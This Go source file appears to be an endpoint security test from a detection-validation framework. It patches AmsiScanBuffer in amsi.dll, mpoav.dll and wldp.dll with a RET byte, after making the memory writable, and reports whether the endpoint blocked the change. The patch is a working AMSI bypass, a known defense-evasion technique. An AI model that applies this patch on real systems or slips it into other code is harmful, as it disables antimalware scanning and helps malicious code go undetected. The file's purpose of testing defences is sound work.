//go:build windows
// +build windows

/*
ID: 586bf106-b208-45fc-9401-727664175ca0
NAME: AMSI or WLDP Bypass via Memory Patching
CREATED: 2024-06-29
scenario: modify permissions/write to AMSI or WLDP [LockDown Policy] related DLLs from memory
*/
package main

import (
	"time"
	"unsafe"

	Endpoint "github.com/preludeorg/test/endpoint"
	"golang.org/x/sys/windows"
)

var dllsToPatch = []string{"amsi.dll", "mpoav.dll", "wldp.dll"}

func main() {
	Endpoint.Start(test, cleanup)
}

func test() {
	Endpoint.Say("[+] Starting test for AMSI or WLDP Bypass via Memory Patching")

	for _, dll := range dllsToPatch {
		hModule, err := windows.LoadLibrary(dll)
		if err != nil {
			Endpoint.Say("[-] Failed to load " + dll)
			continue
		}
		defer windows.FreeLibrary(hModule)

		funcAddr, err := windows.GetProcAddress(hModule, "AmsiScanBuffer")
		if err != nil {
			Endpoint.Say("[-] Failed to get function address in " + dll)
			continue
		}

		var oldProtect uint32
		err = windows.VirtualProtect(funcAddr, unsafe.Sizeof(funcAddr), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
		if err != nil {
			Endpoint.Say("[-] Failed to change memory protection for " + dll)
			Endpoint.Stop(100) // Protected: Test completed normally
		}

		payload := []byte{0xC3} // x86 RET instruction to simulate modification
		var writtenBytes uintptr
		err = windows.WriteProcessMemory(windows.CurrentProcess(), funcAddr, &payload[0], uintptr(len(payload)), &writtenBytes)
		if err != nil {
			Endpoint.Say("[-] Failed to write to memory for " + dll)
			Endpoint.Stop(100) // Protected: Test completed normally
		}

		time.Sleep(3 * time.Second) // Wait to simulate real-world scenario

		Endpoint.Say("[+] " + dll + " memory region modified, potentially suspicious activity detected")
		Endpoint.Stop(101) // Unprotected: Test completed normally but should have been blocked
	}
}

func cleanup() {
	Endpoint.Say("[+] Cleaning up after test")
}